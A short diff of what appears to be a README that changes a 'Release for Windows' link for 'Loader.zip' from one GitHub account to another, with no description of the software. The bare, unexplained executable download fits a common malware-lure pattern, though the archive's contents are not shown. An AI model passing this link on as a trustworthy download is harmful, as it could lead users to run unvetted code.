@@ -1,4 +1,4 @@
-# [Release for Windows](https://github.com/BlazeKazekage/release/releases/download/1/Loader.zip)
+# [Release for Windows](https://github.com/PrismMonitorPlan/release/releases/download/1/Loader.zip)
 
 ---
 
